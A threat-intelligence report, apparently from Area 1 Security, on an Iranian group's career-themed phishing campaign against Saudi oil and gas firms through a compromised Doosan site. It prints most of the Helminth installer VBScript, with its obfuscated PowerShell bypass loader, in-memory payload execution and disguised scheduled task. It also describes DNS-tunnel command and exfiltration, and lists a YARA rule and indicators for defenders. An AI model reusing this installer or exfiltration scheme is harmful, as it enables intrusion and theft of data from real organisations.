OPERATION DOOS
IRN2 TARGETS SAUDI ARABIAN OIL AND GAS
INDUSTRY WITH CAREER-THEMED PHISHING ATTACK

IRN2 SECURITY REPORT / AREA1.COM /

© 2018, REV 072418

IRN2 Targets Saudi Arabian Oil
and Gas Industry with CareerThemed Phishing Attack
TABLE OF CONTENTS
03

EXECUTIVE SUMMARY

04

IRN2 INFECTION VECTOR

05

HELMINTH INSTALLER

08

FAKE DOOSAN PHISHING SITE

09

HELMINTH.DNE POWERSHELL SCRIPT

10

HELMINTH.DNS POWERSHELL SCRIPT

11

ADDITIONAL PHISHING SITES & C2 INFRASTRUCTURE

12

ADDITIONAL HELMINTH.DNE & HELMINTH.DNS SAMPLES

14

INDICATORS OF COMPROMISE

2 / IRN2 SECURITY REPORT / AREA1.COM

IRN2 Targets Saudi Arabian Oil
and Gas Industry with CareerThemed Phishing Attack
EXECUTIVE SUMMARY
Iranian cyber actors, in the Summer of 2017,

procurement, and construction at Saudi Aramco-

compromised a website of Doosan Power Systems

affiliated companies.

India (DPSI) in order to conduct a targeted spearphishing campaign against Saudi Aramco affiliates.

This Iranian cyber actor is identified by Area 1 Security
as IRN2 and has been previously identified in the

DPSI is a subsidiary of Doosan Heavy Industries &

cybersecurity community as OilRig. IRN2 is known

Construction, the infrastructure support business of

to target organizations throughout the middle east,

South Korean conglomerate Doosan Group. Doosan

including Israel, the United Arab Emirates, and

Heavy Industries & Construction, headquartered in

Saudi Arabia. Artifacts of the compromise, which are

Changwon, South Korea, is a power company with

reminiscent of previously reported OilRig campaigns,

business in the manufacturing and construction

leveraged job-related social engineering lures

of nuclear power plants, thermal power stations,

that would ultimately deliver a new variant of the

turbines, generators, and other power equipment.

Helminth backdoor.

The company is also responsible for engineering,

1

http://www.utilities-me.com/article-4668-doosan-to-build-power-plant-for-fadhili-project/

IRN2 SECURITY REPORT / AREA1.COM

IRN2 INFECTION VECTOR
Area 1 Security discovered position.zip (SHA-

The file position.zip is an encrypted ZIP archive that

256:c2731f4c6927025b2747ff3ab0d8bd3d9788d8

was used in a career-themed spear-phish attack against

dd1a08deb8d148c30877b203d2), an artifact of the

the target, which falls closely in line with previously

IRN2 infection vector, hosted at https://dpsiesr.

reported IRN2 attacks that used fake job offers as a

doosan[.]com/content/site/position.zip.

social engineering lure. Area 1 Security frequently sees

The domain dpsiesr.doosan.com is a legitimate

containing a hyperlink to an externally hosted malicious

spear-phish attacks in which the target is sent an email
site operated by a Doosan Heavy Industries &

file. In this case, the file that the actor used was a ZIP

Construction subsidiary known as Doosan Power

archive encrypted with the password 123. Encryption

Systems India (DPSI). The DPSI site is password-

of the ZIP file through password protection was likely

protected and intended for use by authorized

employed to circumvent security scanning.

personnel for what appears to be eSourcing of end-

The password may be communicated within the

to-end power plant services. IRN2’s compromise of

message body of the email, in a previous or

this site to host malware is particularly interesting,

subsequent email, or even sometimes through out-

given that Doosan is a key player in the Saudi Arabia

of-band means. With this particular attack, the actor

oil and gas industry, a well-known target of Iran. The

compromised the DPSI site, placed position.zip

actor likely leveraged Doosan in their targeting of the
oil and gas facility knowing it was a trusted name, and

on the site, then likely crafted an email with a link to
the ZIP archive and sent the email to the target.

therefore would reduce suspicion of malicious activity,
increasing their chances of success.

Inside position.zip is a directory named Position, which contains two files. The first file,
Position.html.lnk, is a Windows shortcut file that will launch a VBScript via the wscript.exe
Windows service. The second file, site.html.url, is the VBScript that is launched by Position.html.lnk.
Below is the parsed metadata from the LNK file (note the timestamps were intentionally modified by
the actor to further obscure the attack, as evidenced in the coming sections):

out: Lnk File: Position.html.lnk
Link Flags: HAS SHELLIDLIST | POINTS TO FILE/DIR | NO DESCRIPTION | HAS RELATIVE PATH STRING
| NO WORKING DIRECTORY | HAS CMD LINE ARGS | HAS CUSTOM ICON
File Attributes: ARCHIVE
Create Time:
2016-07-16 07:42:37.983803

4 / IRN2 SECURITY REPORT / AREA1.COM

Access Time:
2016-07-16 07:42:37.983803
Modified Time: 2016-07-16 07:42:37.983803
Target length: 164864
Icon Index: 242
ShowWnd: SW_SHOWMINNOACTIVE
HotKey: 0
Target is on local volume
Volume Type: Fixed (Hard Disk)
Volume Serial: 7a47aa60
Vol Label:
Base Path: C:\Windows\System32\wscript.exe
(App Path:) Remaining Path:
Relative Path: ..\..\..\..\..\Windows\System32\wscript.exe
Command Line: /E:vbs ././././././././site.html.url
Icon filename: C:\Windows\System32\shell32.dll

The VBScript site.html.url serves as an installer for a variant of the Helminth backdoor.

HELMINTH INSTALLER
The contents of site.html.url (shown below) reveal the inclusion of doom3_Init, a subroutine
identified in malware used in multiple publicly reported IRN2 attacks.

Private Sub Workbook_Open()
Set osList = GetObject(“winmgmts:”).InstancesOf(“Win32_OperatingSystem”)
For Each os In osList
If CInt(Split(os.Version, “.”)(0)) < 6 Then
Exit Sub
Else
Exit For
End If
Next
Call doom3_Init
End SubFunction base64_decode(encodedstr)
Const r64 = “ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/”
Dim table(256), decodedstr
For x = 1 To 256 Step 1
table(x) = -1

5 / IRN2 SECURITY REPORT / AREA1.COM

Next
For x = 1 To 64 Step 1
table(1 + Asc(Mid(r64, x, 1))) = x - 1
Next
Dim size
size = Len(encodedstr)
bits = 0
decodedstr = “”
For x = 1 To size Step 1
c = table(1 + Asc(Mid(encodedstr, x, 1)))
If (c <> -1) Then
If (bits = 0) Then
outword = c * 4
bits = 6
ElseIf (bits = 2) Then
outword = c + outword
decodedstr = decodedstr & (Chr(CLng(“&H” & Hex(outword Mod 256))))
bits = 0
ElseIf (bits = 4) Then
outword = outword + Int(c / 4)
decodedstr = decodedstr & (Chr(CLng(“&H” & Hex(outword Mod 256))))
outword = c * 64
bits = 2
Else
outword = outword + Int(c / 16)
decodedstr = decodedstr & (Chr(CLng(“&H” & Hex(outword Mod 256))))
outword = c * 16
bits = 4
End If
End If
Next
base64_decode = decodedstr
End Function
Function Concat(fstr, sstr)
Concat = fstr & sstr
End Function
Function Concot(fstr)
Concot = fstr & Chr(34)
End Function
Sub doom3_Init()
Set wss = CreateObject(“WScript.Shell”)
pth = wss.ExpandEnvironmentStrings(“%PUBLIC%”) & “\Libraries\”
Set fso = CreateObject(“Scripting.FileSystemObject”)
If Not (fso.FolderExists(pth)) Then
fso.CreateFolder (pth)
End If
If Not (fso.FileExists(pth & “test5.vbs”)) Then
VBS = “CreateObject(“

6 / IRN2 SECURITY REPORT / AREA1.COM

VBS = Concot(VBS)
VBS = Concat(VBS, “WScript.Shell”)
VBS = Concot(VBS)
VBS = Concat(VBS, “).R”)
VBS = Concat(VBS, “un “)
VBS = Concot(VBS)
VBS = Concat(VBS, “cmd /c type “)
VBS = Concat(VBS, pth)
VBS = Concat(VBS, “te”)
VBS = Concat(VBS, “st5.txt”)
VBS = Concat(VBS, “ | “)
VBS = Concat(VBS, “powe”)
VBS = Concat(VBS, “rshell -ex”)
VBS = Concat(VBS, “ec byp”)
VBS = Concat(VBS, “ass -no”)
VBS = Concat(VBS, “profile - “)
VBS = Concot(VBS)
VBS = Concat(VBS, “,0”)
Set spoFile = fso.CreateTextFile(pth & “test5.vbs”)
spoFile.Write (VBS)
spoFile.Close
PS1 = “ [snipped for brevity] [Decoded BASE64 Blob]
[$d=[System.Convert]::FromBase64String(“H4”+” [snipped for brevity]”);
$m=New-Object System.IO.MemoryStream;
$m.Write($d,0,$d.Length);
$m.Seek(0,0)|Out-Null;
iex((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GZipStream($m, 		
[System.IO.Compression.CompressionMode]::Decompress))).readtoend())
] “
Set spoFile = fso.CreateTextFile(pth & “tes” & “t5.txt”)
PS1 = base64_decode(PS1)
spoFile.Write (PS1)
spoFile.Close
Set fso = Nothing
cmd1 = Concat(“sch”, “tasks /cre”)
cmd1 = Concat(cmd1, (“ate /F /sc once /st “ & Chr(34)))
cmd1 = Concat(cmd1, (FormatDateTime((Now + TimeValue(“0:0” & “2:0”)), 4)))
cmd1 = Concat(cmd1, (Chr(34) & “ /tn “))
cmd1 = Concat(cmd1, Chr(34))
cmd1 = Concat(cmd1, (“Office_Update” & Chr(34) & “ /tr “ & pth & “test5.vbs”))
cmd2 = “sch” & “tasks /run /tn “ & Chr(34) & “Office_Update” & Chr(34)
wss.Run cmd1, 0
Wscript.Sleep 5000
wss.Run cmd2, 0
Set wss = Nothing
End If
End Sub
CreateObject(“WScript.Shell”).Run “https://www.doosan-hr.com/”,0
call Workbook_Open

7 / IRN2 SECURITY REPORT / AREA1.COM

The script installs the Helminth PowerShell payloads,

where the <random> portion of the directory name

which Area 1 Security has named Helminth.DnE and

is randomly generated and assigned at runtime. The

Helminth.DnS. Their overall functionality is very

Helminth.DnE and Helminth.DnS PowerShell scripts

similar to publically reported variants of previous

in the analyzed sample were written to this directory

Helminth backdoors. The payloads are embedded

with random file names and a .txt extension. Other

in the installer as templates, and identifiers such

variants used the names DnE.Ps1 and DnS.Ps1,

as variable and function names are assigned at the

respectively, for the payloads. A VBScript is also

time of installation. These identifiers are randomly

written to the same directory with either a randomly

generated, so that no two payload scripts can be

chosen file name or, as identified in previous samples,

identified by the same hash.

backup1.vbs. This script is simply a loader for the
PowerShell payloads and is run via a scheduled task

Helminth.DnE and Helminth.DnS are installed in the
directory %PUBLIC%\Library\RecordedTV<random>\,

FAKE DOOSAN PHISHING SITE
In addition to installing the Helminth PowerShell
scripts, Area 1 Security observed an interesting
technique employed by the VBScript site.html.url.
The script opens a web browser on the victim’s
system and navigates to doosan-hr[.]com, a fake
Doosan website. This technique has not been
observed in previous Helminth deliveries, which have
been carried out through malicious Excel macros.
An image of the page (to the right) reveals a human
resources site for resume submissions, which fits with
the career-themed social engineering tactics used
throughout the attack. The page had several notable
misspellings. In the “Contact Us” section, the state and
country listed were “Ohaio, United State of Amrica.”
Additionally, the copyright notice in the footer of
the website read “All Resived Right 2016-2017
Doosan Company.”

8 / IRN2 SECURITY REPORT / AREA1.COM

every three minutes.

The creation of a fake website and continued

for other accounts, the actor could potentially gain

use of the Doosan brand demonstrates the extra

unauthorized access to those accounts. Not to

steps the actor was willing to take to minimize the

mention, access to the victim’s resume would provide

victim’s suspicions of malicious behavior. It is also

the actor with a wealth of valuable information that

very possible the actor created the site to phish for

could be used for victim profiling or leveraged in the

additional sensitive information, as the page lures

creation of additional social engineering lures.

victims to create an account and upload their resume.
This could be of particular concern from a credential

While the victim browses the phishing site, the

reuse standpoint. If the victim registers an account

Helminth payloads are installed and begin

on the fake site with the same credentials they use

executing in the background.

HELMINTH.DNE POWERSHELL SCRIPT
Helminth.DnE is the first payload installed. The

Helminth.DnE communicates with its C2 server

Helminth.DnE PowerShell script can upload and

(in this sample, coldflys[.]com) over simple HTTP.

download files to and from a C2 server, as well as

All downloads and uploads use a URL that looks

execute code provided by the server. The script

like http://coldflys[.]com/index.aspx?id=<ID>,

installs three directories in its workspace:

where <ID> is a randomized identifier placed by the
installer when filling the Helminth.DnE template.

•
•
•

C:\Users\Public\Libraries

A character is appended to this URL depending

RecordedTV<random>\up\

on the action being performed. The Helminth.DnE

C:\Users\Public\Libraries\

script is programmed to perform the following

RecordedTV<random>\dn\

actions, in order:

C:\Users\Public\Libraries\
RecordedTV<random>\tp\
In the up\ directory, files are placed for upload to

ACTION

CHARACTER
APPENDED
TO URL

the server. Files downloaded from the server are
placed in the dn\ directory. Before files are uploaded

Download file to dn\

2

Download file to dn\
and execute

1

Upload files to up\

3

and downloaded, C:\Users\Public\Libraries\
RecordedTV<random>\uplock and C:\Users\
Public\Libraries\RecordedTV<random>\dwnlock
are created, respectively. This is used as a mutex
to ensure that only one file can be uploaded or
downloaded at a time.

9 / IRN2 SECURITY REPORT / AREA1.COM

Notable facts about the HTTP communication in the client requests include:
• The HTTP Referrer is https://www.google.com

• All uploaded and downloaded files are obfuscated

• The User Agent in the first attempted request is 		

by performing a bitwise XOR with the first character
of the ID used in the HTTP request and encoding the

Microsoft BITS/7.7
• If the first HTTP request results in an exception,

result with Base64

the user agent is changed to Mozilla/5.0
(Windows NT 6.3; Win64; x64; Trident/7.0;
rv:11.0) like Gecko

HELMINTH.DNS POWERSHELL SCRIPT
Helminth.DnS is the second payload installed. The

3.

Helminth.DnS PowerShell script is also responsible for

The script then uses this ID in a DNS query to the
C2 server, requesting additional instructions. The

communicating with a C2 server but uses DNS queries

subdomain of this request follows the pattern:

rather than HTTP. The script can not only send data

zza<ID>00000<base36 of a random number

to the server, but also execute scripts received by

smaller than 46655>30

the server, all via DNS. It randomly generates
subdomains on the same domain as the C2 server

4.

If no further instructions are provided,

(in this case shoterup[.]com) using a domain

the script exits and will be activated the

generation algorithm, and then performs DNS

next time the loader script (backup1.vbs

queries on them. The communications protocol

or <random>.vbs) is called

of this script is detailed below:

5.

If further instructions are required, the C2
server responds with the IP address 33.33.x.y,

1.

First, the script sends a DNS query that acts as an

representing a “command start” signal. Upon

initial C2 beacon. The subdomain of this request

receiving this IP address, the script converts the

follows a specific pattern: zz000000<base36 of

last two octets from decimal integers to ASCII

a random number smaller than 46655>30

characters that are then used to name a batch
file stored in %PUBLIC%\Libraries\tp\xy.bat

2.

The script checks the response to this DNS
query and uses the first octet of the resolving
IP address as an ID for the victim system

10 / IRN2 SECURITY REPORT / AREA1.COM

6.

Once the batch file is created, the script will

8.

The script executes the now complete batch

continue to send DNS queries to the C2 server

file xy.bat and stores its output in %PUBLIC%\

where the subdomain in the queries follows

Libraries\tp\xy.txt

the pattern: zz<ID>00000<base36 of random
number smaller than 46655>232A<hex_

9.

The file xy.txt is then exfiltrated by the script to

filename><i-counter>

the C2 server. The script exfiltrates the data in

The C2 server responds to these DNS queries

and sending it as part of the subdomain in a

with IP addresses, each octet of which is

series of DNS queries. The subdomain follows

converted by the script from decimal integer

the pattern: zz<ID><name of batch file

the text file by dividing it into 24-byte chunks
7.

to ASCII character and appended to the batch

without extension><base36 of sequence

file. The script will continue to send DNS queries

number><base36 of a random number smaller

and write characters to the batch file until the

than 46655><up to 24 bytes of data from

C2 server signals the end of the data stream by

batch file output>

responding with the IP address 35.35.35.35

ADDITIONAL PHISHING SITES & C2 INFRASTRUCTURE
As noted above, the VBScript site.html.url opens a

registrant telephone number +1.15152978248. The

web browser on the victim’s system and navigates to

domain mic-careers[.]com was registered with the

doosan-hr[.]com, a fake Doosan human resources

same number on August 5, 2017, just several days

site for resume submissions. The domain was

before the creation of doosan-hr[.]com. An image

registered on August 13, 2017, and shortly thereafter,

of mic-careers[.]com (shown below) reveals yet

on August 15, 2017, the site was operational. The

another fake career-themed site and use of the exact

actors created doosan-hr.com not only as a social

same language for the “About Us” section as seen on

engineering tatic to ally suspicion but also as a

doosan-hr[.]com. Again, the phishing site lures the

possible means to obtain additional sensitive victim

target to create an account and upload their resume.

information.
The domain mic-careers[.]com was hosted on the
Based on analysis of doosan-hr[.]com, Area 1

IP address 173.254.236[.]148. This IP also hosted

Security identified two additional sites with career-

another suspiciously-named domain, middleeast-

themed domains that were likely used in similar

jobs[.]net, which was registered on September 2,

IRN2 phishing attacks. More specifically, registration

2017. The site is no longer up, and an image of the

information for doosan-hr[.]com revealed the

page is not available. However, based on the name,

11 / IRN2 SECURITY REPORT / AREA1.COM

IP resolution, and time of registration, this domain
was likely another IRN2 career-themed phishing site.
In addition to identifying the other phishing sites,
Area 1 Security observed additional IRN2 command
and control infrastructure. As noted earlier, the C2
domains for the analyzed samples of Helminth.DnE and
Helminth.DnS were coldflys[.]com and shoterup[.]
com, respectively. Publically reported information links
both domains to additional IRN2 operations, including
a campaign in November of 2017 that used a macroenabled XLS file, User list must change password.
xls, to deliver the same variant of the Helminth
backdoor. In fact, use of macro-enabled XLS files to
deliver different variants of Helminth has been detailed
in a number of publicly reported IRN2 campaigns.
Analyzing results of a YARA rule derived from the
Helminth installer, site.html.url, Area 1 Security
found several macro-enabled XLS files that specifically
delivered Helminth.DnE and Helminth.DnS. From
these files, two additional C2 domains were identified:
barsupport[.]org and forskys[.]com.

ADDITIONAL HELMINTH.DNE & HELMINTH.DNS SAMPLES
Five additional malicious files were found via the following YARA rule:
rule Helminth_Installer
{
strings:
$s1 = “VBS = Concat(VBS,”
$s2 = “Function base64_decode”
$s3 = “Private Sub Workbook_Open()”
$s4 = “cmd1 = Concat(“
condition:
$s2 and
$s3 and
(#s1 > 5 or #s4 > 3)
}

12 / IRN2 SECURITY REPORT / AREA1.COM

All samples were macro-enabled XLS files that delivered Helminth.DnE and Helminth.DnS. Details are noted below:
FILENAME: User list must change password.xls
•
•
•
•
•

SHA-256: B409538c99f99b94a5035d9fa44a506b41be0feb23e89b7e4d272ba791aa6002
SHA-1: 0bd6e06470e384571058774d9b43841c8ffe54c2
MD5: c10fc157d1c291c66284a9f07b52a376
Modified Date: 2017-09-10 10:49:12
C2: coldflys[.]com
FILENAME: list.xls

•
•
•
•
•

SHA-256: 0b88bdd5e6beec6c06ec8ad670ddff980acc4e35fa6a434268d6a0203a9dfc7a
SHA-1: 6a3923c6c35ed2ee302de57100b15f9a7aa20f9a
MD5: 1579208bc40a873e82603844990f6a5e
Modified Date: 2017-07-18 12:15:15
C2: shoterup[.]com
FILENAME: rewards.xls

•
•
•
•
•

SHA-256: cbbd0b863c8a31e577b9eabd4d2311a3a919370b0cc848cf297151321b3f6e66
SHA-1: 88ee2c27e1dd4ed3400adf7e560d4c4ffeae17bb
MD5: 20c240bde16c6dc2f1638bcdf944975c
Modified Date: 2017-05-16 03:50:39
C2: forskys[.]com
FILENAME: survey sheet.xls

•
•
•
•
•

SHA-256: 214cd857955ed59f404f5b9fb76751eb4c2b45f4c2b9b821903d8f6c5269d810
SHA-1: 80a1a1bcf4868d08a0e65475ced6b8fd337fdf86
MD5: 3db49888dd5336befee765d43f23d9f8
Modified Date: 2017-02-22 15:58:59
C2: barsupport[.]org
FILENAME: Survey.xls

•
•
•
•
•
•

SHA-256: eb1f47c9f71d3fd2ff744a9454c256bf3248921fbcbadf0a80d5e73a0c6a82de
SHA-1: 8f3953da84ec9d34ae6b97ff0f574758d39edad9
MD5: e37bafef0d3315a015f48a2bf845d855
Modified Date: 2017-02-20 16:48:43
C2: barsupport[.]org
Contained in Survey.zip
		
(1a30d55623ae68703793993c94e2af620f3655b206023ecdade099aed6a16452)

13 / IRN2 SECURITY REPORT / AREA1.COM

INDICATORS OF COMPROMISE
SHA-256 HASHES:
c2731f4c6927025b2747ff3ab0d8bd3d9788d8dd1a08deb8d148c30877b203d2
0b88bdd5e6beec6c06ec8ad670ddff980acc4e35fa6a434268d6a0203a9dfc7a
214cd857955ed59f404f5b9fb76751eb4c2b45f4c2b9b821903d8f6c5269d810
eb1f47c9f71d3fd2ff744a9454c256bf3248921fbcbadf0a80d5e73a0c6a82de
1a30d55623ae68703793993c94e2af620f3655b206023ecdade099aed6a16452”
b409538c99f99b94a5035d9fa44a506b41be0feb23e89b7e4d272ba791aa6002
cbbd0b863c8a31e577b9eabd4d2311a3a919370b0cc848cf297151321b3f6e66
02171e646f919ef3a145323928f73f0b7104a873a4842c23abb8628d740eebec
7595a6534866ab0fdc0d088a0841f04d689d6eba41761ad20976a40cfa4fbdd0
SHA-1 HASHES:
c7806e21fd9ea72d8de4b01f9dbd65a74f070b57
0bd6e06470e384571058774d9b43841c8ffe54c2
6a3923c6c35ed2ee302de57100b15f9a7aa20f9a
88ee2c27e1dd4ed3400adf7e560d4c4ffeae17bb
80a1a1bcf4868d08a0e65475ced6b8fd337fdf86
8f3953da84ec9d34ae6b97ff0f574758d39edad9
c71123d2f76874def40041a535839dd2db31d645
MD5 HASHES:
991241310d775edff106be83719c07ab
c10fc157d1c291c66284a9f07b52a376
1579208bc40a873e82603844990f6a5e
20c240bde16c6dc2f1638bcdf944975c
3db49888dd5336befee765d43f23d9f8
E37bafef0d3315a015f48a2bf845d855
848e6582976d56f0c4b32f89f750a74c
COMPROMISED DPSI SITE AND URL:
dpsiesr.doosan[.]com
https://dpsiesr.doosan[.]com/content/site/position.zip

PHISHING SITES:
doosan-hr[.]com
mic-careers[.]com
middleeast-jobs[.]net

14 / IRN2 SECURITY REPORT / AREA1.COM

HELMINTH HTTP C2:
coldflys[.]com
shoterup[.]com
barsupport[.]org
Forskys[.]com
http://coldflys[.]com/index.aspx?id=<ID>
HELMINTH DNS C2:
zz000000<random>30.shoter[.]com
zz<ID>00000<random>30.shoter[.]com
zz<ID>00000<random>232A<hex_filename><i-counter>.shoter[.]com
zz<ID><name of batch file><sequence number><random><24 bytes of batch file output>.shoter[.]com
HELMINTH.DNE USER AGENTS:
Microsoft BITS/7.7
Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; rv:11.0) like Gecko
HELMINTH LOADER:
%PUBLIC%\Libraries\RecordedTV<random>\<random>.vbs
%PUBLIC%\Libraries\RecordedTV<random>\backup1.vbs
HELMINTH INSTALLATION:
%PUBLIC%\Libraries\RecordedTV<random>\<random>.txt
%PUBLIC%\Libraries\RecordedTV<random>\DnE.Ps1
%PUBLIC%\Libraries\RecordedTV<random>\DnS.Ps1
HELMINTH.DNE:
%PUBLIC%\Libraries\RecordedTV<random>\up\
%PUBLIC%\Libraries\RecordedTV<random>\dn\
%PUBLIC%\Libraries\RecordedTV<random>\tp\
%PUBLIC%\Libraries\RecordedTV<random>\uplock
%PUBLIC%\Libraries\RecordedTV<random>\dwnlock
HELMINTH.DNS:
%PUBLIC%\Libraries\tp\xy.bat
%PUBLIC%\Libraries\tp\xy.txt

15 / IRN2 SECURITY REPORT / AREA1.COM